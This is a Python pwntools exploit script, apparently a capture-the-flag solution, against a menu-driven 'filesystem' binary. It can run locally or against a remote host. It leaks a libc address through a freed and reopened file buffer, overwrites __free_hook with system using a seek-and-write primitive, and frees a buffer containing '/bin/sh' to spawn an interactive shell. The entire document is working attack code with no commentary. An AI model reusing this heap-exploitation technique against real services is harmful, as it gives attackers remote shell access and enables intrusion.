from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./filesystem")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./filesystem")
else:
    p = remote(sys.argv[1],sys.argv[2])
    libc = ELF("./libc-2.27.so")
    elf = ELF("./filesystem")

def menu(choice):
    p.sendlineafter("> ",str(choice))

def getfile(name,type_,width,height,size):
    menu("touch")
    p.sendlineafter("Input filename: ",name)
    p.sendlineafter("Input filetype: ",type_)
    if type_ == "BIN":
        p.sendlineafter("Input the size: ",str(size))
    else:
        p.sendlineafter("Input the width: ",str(width))
        p.sendlineafter("Input the height: ",str(height))

def setoff(name,off):
    menu("seek")
    p.sendlineafter("Input filename: ",name)
    p.sendlineafter("Input the offset: ",str(off))

def show(name,size):
    menu("read")
    p.sendlineafter("Input filename: ",name)
    p.sendlineafter("Input the size: ",str(size))

def edit(name,content):
    menu("write")
    p.sendlineafter("Input filename: ",name)
    p.sendafter("Input your content: ",content)

def init(name):
    menu("open")
    p.sendlineafter("Input filename: ",name)

def free(name):
    menu("close")
    p.sendlineafter("Input filename: ",name)

def txt_menu(choice):
    p.sendlineafter("Your operation: ",str(choice))

def txt_edit_byte(name,x,y,byte):
    menu("edit")
    p.sendlineafter("Input filename: ",name)
    txt_menu(1)
    p.sendlineafter("seperated by - :","{x}-{y}-{z}".format(x = x,y = y,z = chr(byte)))
    p.sendlineafter("Continue?(y/n):","n")

code_base = 0x555555554000
def debugf():
    if debug:
        gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x4DF8)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
getfile("a1","BIN",0x50,0x18,0x500)
init("a1")
getfile("a3","BIN",0x50,0x18,0x10)
free("a1")
init("a1")
show("a1",0x10)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - 96 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
target = libc.symbols["__free_hook"]
payload = p64(libc.symbols["system"])
getfile("a2","BIN",0x50,0x18,target + 8)
init("a2")
setoff("a2",target)
edit("a2",payload)
setoff("a1",0)
edit("a1","/bin/sh\x00")
debugf()
free("a1")
p.interactive()

